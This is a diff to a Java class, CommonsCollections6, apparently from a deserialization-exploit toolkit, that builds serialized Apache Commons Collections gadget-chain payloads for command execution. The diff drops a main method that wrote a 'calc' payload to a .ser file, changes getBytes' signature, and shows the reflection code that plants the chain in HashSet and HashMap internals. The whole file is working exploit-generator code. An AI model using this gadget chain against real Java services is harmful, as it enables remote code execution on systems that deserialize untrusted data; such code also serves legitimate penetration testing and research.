@@ -10,7 +10,6 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.HashMap;
@@ -18,14 +17,8 @@ import java.util.HashSet;
 import java.util.Map;
 
 public class CommonsCollections6 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         final String[] execArgs = new String[]{String.valueOf(type)};
 
         final Transformer[] transformers = new Transformer[]{
@@ -50,7 +43,7 @@ public class CommonsCollections6 {
 
         HashSet map = new HashSet(1);
         map.add("foo");
-        Field f = null;
+        Field f;
         try {
             f = HashSet.class.getDeclaredField("map");
         } catch (NoSuchFieldException e) {
@@ -60,7 +53,7 @@ public class CommonsCollections6 {
         Reflections.setAccessible(f);
         HashMap innimpl = (HashMap) f.get(map);
 
-        Field f2 = null;
+        Field f2;
         try {
             f2 = HashMap.class.getDeclaredField("table");
         } catch (NoSuchFieldException e) {
@@ -75,7 +68,7 @@ public class CommonsCollections6 {
             node = array[1];
         }
 
-        Field keyField = null;
+        Field keyField;
         try {
             keyField = node.getClass().getDeclaredField("key");
         } catch (Exception e) {
